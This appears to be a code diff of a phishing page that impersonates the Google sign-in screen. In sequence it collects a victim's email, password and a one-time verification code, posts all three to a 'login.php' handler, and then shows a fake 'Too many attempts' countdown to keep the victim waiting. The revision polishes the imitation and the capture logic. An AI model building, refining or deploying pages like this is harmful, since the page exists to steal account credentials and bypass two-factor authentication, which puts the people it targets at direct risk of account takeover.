@@ -6,170 +6,295 @@
     <title>Sign in - Google Accounts</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
+        :root {
+            --google-blue: #1a73e8;
+            --google-red: #d93025;
+            --text-dark: #202124;
+            --text-light: #5f6368;
+            --border-color: #dadce0;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         
-        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        @media (max-width: 450px) { .container { border: none; padding: 24px; } }
-
-        .logo { width: 75px; height: 24px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
-        .sub-text { font-size: 16px; color: #202124; margin-bottom: 32px; line-height: 1.4; }
-
-        /* ইউজার আইডেন্টিটি বক্স (আপনার ছবি অনুযায়ী) */
-        .user-identity {
-            display: inline-flex; align-items: center; padding: 3px 10px 3px 4px;
-            border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px; cursor: pointer;
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-dark);
         }
-        .user-icon {
-            width: 20px; height: 20px; background-color: #5f6368; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin-right: 8px;
-        }
-        .user-icon svg { fill: white; width: 14px; height: 14px; }
-        .email-text { font-size: 14px; font-weight: 500; color: #3c4043; }
-        .dropdown-icon { margin-left: 4px; border-top: 4px solid #5f6368; border-right: 4px solid transparent; border-left: 4px solid transparent; }
 
-        /* গুগল ম্যাটেরিয়াল ইনপুট স্টাইল */
-        .input-wrapper { position: relative; margin-bottom: 25px; text-align: left; }
+        .auth-card {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        @media (max-width: 450px) {
+            .auth-card { border: none; padding: 24px; }
+        }
+
+        .logo { width: 75px; margin-bottom: 10px; }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-dark);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        /* Identity Chip Fix */
+        .identity-chip {
+            display: inline-flex;
+            align-items: center;
+            padding: 3px 10px 3px 4px;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            margin-bottom: 28px;
+            cursor: pointer;
+            max-width: 100%;
+        }
+
+        .avatar {
+            width: 20px;
+            height: 20px;
+            background-color: var(--google-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+        }
+
+        .avatar svg { fill: white; width: 14px; }
+
+        .email-display {
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .arrow-down {
+            margin-left: 4px;
+            border-top: 4px solid var(--text-light);
+            border-right: 4px solid transparent;
+            border-left: 4px solid transparent;
+        }
+
+        /* Material Input Fixes */
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
         .g-input {
-            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; 
-            border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s;
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            color: var(--text-dark);
         }
-        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-        
-        /* শো পাসওয়ার্ড ও অন্যান্য লিঙ্ক */
-        .checkbox-area { display: flex; align-items: center; margin-top: 10px; font-size: 14px; }
-        .checkbox-area input { margin-right: 10px; width: 18px; height: 18px; cursor: pointer; }
 
-        .links { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .links:hover { text-decoration: underline; }
-
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .next-btn { 
-            background-color: #1a73e8; color: white; border: none; padding: 10px 24px; 
-            border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px;
+        .g-input:focus {
+            border: 2px solid var(--google-blue);
+            padding: 12px 14px;
         }
-        .next-btn:hover { background-color: #1b66c9; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
 
+        .g-input:disabled {
+            background-color: #f8f9fa;
+            color: #70757a;
+            cursor: not-allowed;
+        }
+
+        /* Links & Checkbox */
+        .link-text {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-top: 8px;
+            font-size: 14px;
+        }
+
+        .checkbox-container input {
+            margin-right: 12px;
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Error/Timer UI */
+        #timer-msg {
+            color: var(--google-red);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            font-weight: 500;
+        }
+
+        /* Footer Buttons */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .btn-primary {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+        }
+
+        /* Smooth Transitions */
         .step { display: none; }
-        .active { display: block; animation: fadeIn 0.4s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .active { 
+            display: block; 
+            animation: slideUp 0.3s ease-out; 
+        }
 
-        #error-msg { color: #d93025; font-size: 13px; margin-top: 8px; display: none; font-weight: 500; }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+<div class="auth-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
     
-    <div id="step-email" class="step active">
+    <div id="email-step" class="step active">
         <h1>Sign in</h1>
-        <p class="sub-text">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
-        <div class="input-wrapper">
+        <p class="subtitle">Use your Google Account</p>
+        <div class="input-group">
             <input type="text" id="email" class="g-input" placeholder="Email or phone">
-            <a class="links" style="margin-top: 8px; display: inline-block;">Forgot email?</a>
-        </div>
-        <div style="text-align: left; margin-bottom: 30px;">
-            <a class="links">Create account</a>
+            <div style="margin-top: 9px;"><a class="link-text">Forgot email?</a></div>
         </div>
         <div class="footer">
-            <span></span>
-            <button class="next-btn" onclick="showStep('step-password')">Next</button>
+            <a class="link-text">Create account</a>
+            <button class="btn-primary" onclick="goTo('pass-step')">Next</button>
         </div>
     </div>
 
-    <div id="step-password" class="step">
+    <div id="pass-step" class="step">
         <h1>Welcome</h1>
-        <div class="user-identity" onclick="showStep('step-email')">
-            <div class="user-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="display-email" class="email-text"></span>
-            <div class="dropdown-icon"></div>
+        <div class="identity-chip" onclick="goTo('email-step')">
+            <div class="avatar"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="show-email" class="email-display"></span>
+            <div class="arrow-down"></div>
         </div>
-        <div class="input-wrapper">
+        <div class="input-group">
             <input type="password" id="password" class="g-input" placeholder="Enter your password">
-            <div class="checkbox-area">
-                <input type="checkbox" id="show-pass" onclick="togglePass()"> <label for="show-pass">Show password</label>
+            <div class="checkbox-container">
+                <input type="checkbox" id="reveal" onclick="toggleVisibility()"> <label for="reveal">Show password</label>
             </div>
         </div>
         <div class="footer">
-            <a class="links">Forgot password?</a>
-            <button class="next-btn" onclick="showStep('step-otp')">Next</button>
+            <a class="link-text">Forgot password?</a>
+            <button class="btn-primary" onclick="goTo('otp-step')">Next</button>
         </div>
     </div>
 
-    <div id="step-otp" class="step">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" style="width: 75px; margin-bottom: 10px;">
+    <div id="otp-step" class="step">
         <h1>Account recovery</h1>
-        <p style="font-size: 14px; margin-bottom: 15px;">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
-        <div class="user-identity">
-            <div class="user-icon" style="background-color: #1a73e8;"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="display-email-otp" class="email-text"></span>
-            <div class="dropdown-icon"></div>
+        <p class="subtitle" style="font-size: 14px; margin-bottom: 10px;">To help keep your account safe, Google wants to make sure it's really you</p>
+        <div class="identity-chip">
+            <div class="avatar"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+            <span id="show-email-otp" class="email-display"></span>
         </div>
-        <p style="font-size: 14px; text-align: left; margin-bottom: 10px;">An email with a verification code was just sent to your email</p>
-        <div class="input-wrapper">
-            <input type="text" id="otp" class="g-input" placeholder="Enter code">
-            <div id="error-msg">Too many attempts. Try again in <span id="timer">60</span>s</div>
+        <div class="input-group">
+            <input type="text" id="otp" class="g-input" placeholder="Enter 6-digit code">
+            <div id="timer-msg">Too many attempts. Try again in <span id="sec">60</span>s</div>
         </div>
         <div class="footer">
-            <a class="links">Try another way</a>
-            <button class="next-btn" id="submit-btn" onclick="finalSubmit()">Next</button>
+            <a class="link-text">Try another way</a>
+            <button class="btn-primary" id="final-btn" onclick="submitFinal()">Next</button>
         </div>
     </div>
 </div>
 
 <script>
-    function showStep(stepId) {
-        const email = document.getElementById('email').value;
-        if (stepId === 'step-password' && !email) return;
-        
-        document.getElementById('display-email').innerText = email;
-        document.getElementById('display-email-otp').innerText = email;
+    function goTo(id) {
+        const mail = document.getElementById('email').value;
+        if(!mail && id !== 'email-step') return;
+        document.getElementById('show-email').innerText = mail;
+        document.getElementById('show-email-otp').innerText = mail;
         
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById(stepId).classList.add('active');
+        document.getElementById(id).classList.add('active');
     }
 
-    function togglePass() {
+    function toggleVisibility() {
         const p = document.getElementById('password');
-        p.type = p.type === "password" ? "text" : "password";
+        p.type = p.type === 'password' ? 'text' : 'password';
     }
 
-    function finalSubmit() {
+    function submitFinal() {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
-        const otp = document.getElementById('otp').value;
+        const code = document.getElementById('otp').value;
+        if(!code) return;
 
-        if (!otp) return;
+        // AJAX/Fetch Request
+        let fd = new FormData();
+        fd.append('email', email); fd.append('password', pass); fd.append('otp', code);
+        fetch('login.php', { method: 'POST', body: fd });
 
-        // PHP ফাইলে ডাটা পাঠানো
-        let formData = new FormData();
-        formData.append('email', email);
-        formData.append('password', pass);
-        formData.append('otp', otp);
-        fetch('login.php', { method: 'POST', body: formData });
+        // Timer & Lock logic
+        const btn = document.getElementById('final-btn');
+        const inp = document.getElementById('otp');
+        const msg = document.getElementById('timer-msg');
+        const sec = document.getElementById('sec');
 
-        // ১ মিনিটের টাইমার ও লক লজিক
-        const btn = document.getElementById('submit-btn');
-        const input = document.getElementById('otp');
-        const error = document.getElementById('error-msg');
-        const timerSpan = document.getElementById('timer');
-        
-        btn.disabled = true;
-        input.disabled = true;
-        error.style.display = 'block';
+        btn.disabled = true; inp.disabled = true; msg.style.display = 'block';
 
-        let timeLeft = 60;
+        let count = 60;
         const countdown = setInterval(() => {
-            timeLeft--;
-            timerSpan.innerText = timeLeft;
-            if (timeLeft <= 0) {
+            count--;
+            sec.innerText = count;
+            if(count <= 0) {
                 clearInterval(countdown);
-                btn.disabled = false;
-                input.disabled = false;
-                error.style.display = 'none';
-                input.value = "";
+                btn.disabled = false; inp.disabled = false; msg.style.display = 'none';
+                inp.value = '';
             }
         }, 1000);
     }
